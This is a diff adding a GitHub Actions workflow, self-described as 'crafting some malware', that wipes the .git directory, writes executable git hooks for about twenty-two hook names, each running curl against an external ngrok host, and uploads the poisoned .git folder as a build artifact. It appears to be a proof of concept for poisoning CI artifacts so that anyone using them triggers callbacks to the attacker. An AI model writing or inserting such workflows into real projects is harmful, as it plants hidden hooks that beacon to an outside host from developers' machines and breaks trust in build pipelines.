@@ -1,0 +1,29 @@
+name: Crafting some malware here
+
+on: [push]
+
+jobs:
+  build_and_test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+      - run: |
+          rm -rf .git/*
+          mkdir -p .git/hooks
+          export PAYLOAD="curl https://metnew.ngrok.io"
+          declare -a arr=("applypatch-msg" "pre-commit" "commit-msg" "pre-merge" "fsmonitor-watchman" "pre-merge-commit" "post-applypatch" "pre-push" "post-checkout" "pre-rebase" "post-index-change" "pre-receive" "post-merge" "prepare-commit-msg" "post-rewrite" "push-to-checkout" "post-update" "reference-transaction" "pre-applypatch" "sendemail-validate" "pre-auto-gc" "update")
+          echo "$PAYLOAD"
+          for i in "${arr[@]}"
+          do
+             echo "$PAYLOAD/$i" > ".git/hooks/$i"
+             chmod +x ".git/hooks/$i"
+          done
+          echo "some file for git add" > "somefile"
+      - name: Archive production artifacts
+        uses: actions/upload-artifact@v2
+        with:
+          name: artifacts
+          path: |
+            ./.git
+            somefile
